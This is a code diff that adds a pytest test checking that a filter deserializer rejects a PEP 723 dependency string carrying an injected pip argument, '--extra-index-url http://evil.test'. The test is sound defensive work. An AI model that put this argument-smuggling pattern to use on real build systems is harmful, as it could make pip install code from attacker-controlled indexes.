@@ -1455,6 +1455,21 @@ def test_deserialize_filter_rejects_invalid_node_metadata():
         MODULE.deserialize_filter(src, filename="filter.cjs")
 
 
+def test_deserialize_filter_rejects_invalid_python_dependencies():
+    # A crafted saved file must not smuggle pip arguments through the PEP 723 block into
+    # the image-build `pip install` line; validation rejects non-package-name strings.
+    src = (
+        "# /// script\n"
+        '# requires-python = ">=3.12"\n'
+        '# dependencies = ["requests==2.0 --extra-index-url http://evil.test"]\n'
+        "# ///\n"
+        '"""x"""\n\n\n'
+        "def filter_paths(paths):\n    return paths\n"
+    )
+    with pytest.raises(ValueError, match="Invalid package name"):
+        MODULE.deserialize_filter(src, filename="evil.py")
+
+
 def test_run_saved_replays_without_generating(tmp_path):
     (tmp_path / "a.mp3").write_text("x")
     code = 'def filter_paths(paths):\n    return [p for p in paths if p.endswith(".mp3")]'
